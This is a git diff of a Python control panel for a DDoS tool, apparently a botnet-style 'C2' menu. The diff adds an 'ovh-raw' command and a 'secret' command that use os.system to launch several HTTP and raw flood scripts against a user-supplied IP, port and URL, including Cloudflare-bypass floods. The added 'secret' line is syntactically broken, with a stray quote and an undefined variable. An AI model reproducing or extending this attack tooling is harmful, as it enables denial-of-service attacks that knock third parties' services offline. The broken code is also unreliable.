@@ -138,18 +138,18 @@ def menu():
  \x1b[38;2;51;51;255m                                                                ╦  ╔\x1b[38;2;153;51;255m═╗  ╔═╗\x1b[38;2;255;51;255m  ╔═╗  ╔╗╔
 \x1b[38;2;51;51;255m                                                                 ║  ╠\x1b[38;2;153;51;255m═╣  ╠═╝\x1b[38;2;255;51;255m  ╠═╣  ║║║
 \x1b[38;2;51;51;255m                                                                ╚╝  ╩ \x1b[38;2;153;51;255m╩  ╩  \x1b[38;2;255;51;255m  ╩ ╩  ╝╚╝
-\x1b[38;2;51;51;255m                                      \x1b[38;2;51;51;255m╚══════════════════╦═══════════\x1b[38;2;153;51;255m═══════\x1b[38;2;255;51;255m═════════════════╦══════════════════╝
+\x1b[38;2;51;51;255m                  \x1b[38;2;51;51;255m╚══════════════════╦═══════════\x1b[38;2;153;51;255m═══════\x1b[38;2;255;51;255m═════════════════╦══════════════════╝
 \x1b[38;2;51;51;255m                                                         ║        Cre\x1b[38;2;153;51;255mated By\x1b[38;2;255;51;255m @9_hl4     \x1b[38;2;51;51;255m     ║
 \x1b[38;2;51;51;255m                                        \x1b[38;2;51;51;255m╔════════════════╩═══════════\x1b[38;2;153;51;255m═══════\x1b[38;2;255;51;255m═════════════════╩═══════════════╗ 
 \x1b[38;2;51;51;255m                                 ╔══════╝                    Type "he\x1b[38;2;153;51;255mlp" to \x1b[38;2;255;51;255mshow commands                    ╚══════╗
-\x1b[38;2;51;51;255m                                 \x1b[38;2;51;51;255m╚══════════════════════════════════\x1b[38;2;153;51;255m═════════\x1b[38;2;255;51;255m═══════════════════════════════════════╝                         
+\x1b[38;2;51;51;255m             \x1b[38;2;51;51;255m╚══════════════════════════════════\x1b[38;2;153;51;255m═════════\x1b[38;2;255;51;255m═══════════════════════════════════════╝                         
 """)
 
 def main():
     menu()
     while(True):
-        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mC\x1b[38;2;0;49;147m]
-\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
+        cnc = input('''\x1b[38;2;51;51;255m╔══[Japan\x1b[38;2;153;51;255m@Japan]
+╚══\x1b[38;2;255;51;255m═══➤ \x1b[38;2;239;239;239m''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
         elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
@@ -158,7 +158,19 @@ def main():
             rules()
             
 # LAYER 7 METHODS
- 
+
+        elif "ovh-raw" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
+            except IndexError:
+                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
+        
         elif "ovh-beam" in cnc:
             try:
                 method = cnc.split()[1]
@@ -217,6 +229,17 @@ def main():
             except IndexError:
                 print('Usage: cf-bypass <url> <time> <threads>')
                 print('Example: cf-bypass http://example.com 60 1250')
+
+        elif "secret" in cnc:
+            url = cnc.split()[1]
+            time = cnc.split()[2]
+            thread = cnc.split()[3]
+            per = cnc.split()[4]
+            port = cnc.split()[5]
+            conns = cnc.split()[6]
+            os.system(f'node cf.js {url} {time} {thread} && node HTTP-RAND.js {url} {time} && node HTTP-RAW {url} {time} && node HTTP-SOCKET {url} {per} {time} && node slow.js {url} {time} && ./OVH-BEAM GET {ip} {port} {time} 1024 && ./ovh-raw GET {ip} {port} {time} {conns}'')
+            
+            
 
 
         elif "help" in cnc:
